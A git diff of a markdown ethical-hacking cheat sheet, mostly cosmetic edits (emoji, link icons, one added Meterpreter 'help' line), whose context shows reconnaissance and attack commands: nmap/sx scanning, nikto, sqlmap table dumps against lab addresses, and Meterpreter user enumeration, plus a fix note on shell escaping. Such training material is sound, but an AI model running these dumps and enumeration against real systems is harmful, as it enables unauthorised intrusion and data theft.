@@ -2,8 +2,7 @@
 
 [Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)
 
-<details>
-<summary><b> Recon </b></summary>
+<details><summary><b> ⏬ Recon </b></summary>
   ##### via Web
   - [Tor Browser](https://www.torproject.org/download/)
   - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
@@ -26,7 +25,7 @@
 
 - [Central Ops .net](https://centralops.net/co/)
 - [OSINT framework](https://osintframework.com/)
-- [NMAP cheatsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/nmap_cheatsheet.md)
+- [NMAP cheatsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/nmap_cheatsheet.md) 🔗
 - SX tool : command line network scanning tool that perform Arp scanning , TCP & UDP 
   ````js
   sx arp 10.10.1.0/24
@@ -176,7 +175,7 @@ nikto -h url -Cgidirs all
   ````
 
 #### Web explotation
-[SQLmap cheetsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/sqlmap_cheatsheet.md)
+[SQLmap cheetsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/sqlmap_cheatsheet.md) 🔗
 ````js
 // sql injection
 sqlmap -u http://10.10.197.40/administrator.php --forms --dump
@@ -200,7 +199,7 @@ Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --colum
 sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
 ````
 
-<details><summary>DVWA</summary>
+<details><summary> ⏬ DVWA</summary>
 Basic Commands
 
 ````bash
@@ -262,6 +261,7 @@ If you have Meterpreter access:
   meterpreter > getuid
   #List all users:
   meterpreter > run post/windows/gather/enum_users
+  meterpreter > help
 ````
 > How to Fix the Vulnerability?
   - Sanitize input: Use escapeshellcmd() and escapeshellarg().
